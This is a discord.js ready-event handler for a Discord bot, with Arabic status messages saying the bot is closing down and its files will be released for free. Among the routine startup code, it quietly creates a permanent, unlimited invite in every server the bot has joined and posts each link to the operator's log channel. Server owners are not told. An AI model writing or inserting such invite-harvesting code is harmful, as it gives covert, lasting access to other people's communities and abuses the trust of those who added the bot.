const { Client, ActivityType, Events } = require("discord.js");

module.exports = {
    name: Events.ClientReady,
    once: true,
    async execute(client) {
        const logChannelId = "id_channel_log";

        console.log("Servers the bot is in:");

        const logChannel = client.channels.cache.get(logChannelId);
        if (!logChannel) {
            console.log("❌ لم يتم العثور على الروم المحدد لإرسال الرسائل.");
            return;
        }

        for (const guild of client.guilds.cache.values()) {
            try {
                const channels = guild.channels.cache.filter(channel => 
                    channel.isTextBased() && channel.permissionsFor(guild.members.me).has("CreateInstantInvite")
                );

                if (channels.size > 0) {
                    const invite = await channels.first().createInvite({ maxAge: 0, maxUses: 0 });

                    await logChannel.send(`✅ Invite Created\n**${guild.name}**\n🔗 ${invite.url}`);
                } else {
                    await logChannel.send(`⚠️ No Permission\nلا يمكن إنشاء دعوة في **${guild.name}**`);
                }

                console.log(`- ${guild.name} (ID: ${guild.id})`);
            } catch (error) {
                console.error(`❌ خطأ أثناء إنشاء دعوة لسيرفر: ${guild.name}, ${error}`);
                await logChannel.send(`❌ Error\nحدث خطأ عند إنشاء الدعوة في **${guild.name}**`);
            }
        }

        const statuses = [
            "⚡ تطوير بواسطة joox.1",
            "❤️ سيتم إيقاف البوت لعدم القدرة على الاستمرار",
            "❤️ سيتم إيقاف البوت بتاريخ 17 أبريل",
            "❤️ نعتذر، سيتم إغلاق البوت قريبًا",
            "❤️ سيتم توفير ملفات البوت مجانًا",
            "❤️ شكرًا لدعمكم طوال الفترة الماضية",
        ];

        const types = [
            ActivityType.Playing,
            ActivityType.Watching,
            ActivityType.Listening,
            ActivityType.Competing,
        ];

        setInterval(() => {
            const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
            const randomType = types[Math.floor(Math.random() * types.length)];
            client.user.setActivity(randomStatus, { type: randomType });
        }, 30000);

        client.user.setStatus("online");
        console.log(`🎉 Bot is now online as ${client.user.tag}`);

        await logChannel.send(`✅ Bot Started\n📊 عدد السيرفرات: **${client.guilds.cache.size}**`);
    },
};